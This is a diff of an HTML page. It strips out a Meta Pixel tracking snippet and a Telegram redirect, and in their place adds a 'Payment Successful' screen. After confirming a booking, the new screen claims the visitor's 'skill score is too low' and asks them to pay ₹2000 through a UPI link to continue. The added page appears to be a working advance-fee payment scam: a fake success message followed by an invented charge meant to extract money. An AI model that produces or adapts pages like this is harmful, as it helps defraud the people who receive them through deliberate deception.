@@ -3,42 +3,62 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Thank You!</title>
-
-  <!-- Meta Pixel Code -->
-  <script>
-  !function(f,b,e,v,n,t,s)
-  {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
-  n.callMethod.apply(n,arguments):n.queue.push(arguments)};
-  if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
-  n.queue=[];t=b.createElement(e);t.async=!0;
-  t.src=v;s=b.getElementsByTagName(e)[0];
-  s.parentNode.insertBefore(t,s)}(window, document,'script',
-  'https://connect.facebook.net/en_US/fbevents.js');
-  fbq('init', '1034493695191676');
-  fbq('track', 'Lead'); // Conversion event
-  </script>
-  <noscript><img height="1" width="1" style="display:none"
-  src="https://www.facebook.com/tr?id=1034493695191676&ev=Lead&noscript=1"
-  /></noscript>
-  <!-- End Meta Pixel Code -->
-
+  <title>Payment Successful</title>
   <style>
     body {
+      background-color: #e0ffe0;
       font-family: Arial, sans-serif;
       text-align: center;
-      margin-top: 100px;
+      padding: 50px;
+    }
+
+    .message-box {
+      background: white;
+      padding: 40px;
+      border-radius: 15px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      display: inline-block;
+    }
+
+    h1 {
+      color: green;
+    }
+
+    p {
+      font-size: 18px;
+      margin-top: 10px;
+    }
+
+    .next-step {
+      margin-top: 30px;
+      font-weight: bold;
+      color: #d32f2f;
+    }
+
+    .btn {
+      display: inline-block;
+      margin-top: 20px;
+      background-color: #28a745;
+      color: white;
+      padding: 12px 25px;
+      text-decoration: none;
+      font-size: 16px;
+      border-radius: 8px;
+    }
+
+    .btn:hover {
+      background-color: #218838;
     }
   </style>
-
-  <script>
-    setTimeout(function() {
-      window.location.href = "https://t.me/+3Ov_qx0gir45YWRl";
-    }, 3000);
-  </script>
 </head>
 <body>
-  <h1>Thanks for joining!</h1>
-  <p>Redirecting you to our Telegram channel...</p>
+  <div class="message-box">
+    <h1>Payment Successful!</h1>
+    <p>Thank you for your payment.</p>
+    <p>Your booking is confirmed.</p>
+    <p class="next-step">Dear user, your skill score is too low.</p>
+    <p class="next-step">To continue, please pay ₹2000.</p>
+    <a class="btn" href="upi://pay?pa=6005973034@ybl&pn=SkillScore&am=2000&cu=INR">Pay ₹2000 Now</a>
+  </div>
 </body>
 </html>
